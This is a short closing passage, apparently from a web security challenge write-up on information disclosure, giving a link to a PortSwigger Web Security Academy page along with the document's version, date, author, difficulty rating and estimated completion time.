- [PortSwigger Web Security Academy](https://portswigger.net/web-security/information-disclosure) - Information disclosure

---

**Document Version**: 1.0
**Last Updated**: 2025-10-10
**Author**: Walter Barr
**Challenge Difficulty**: ⭐⭐⭐ (3/6)
**Estimated Time**: 20-45 minutes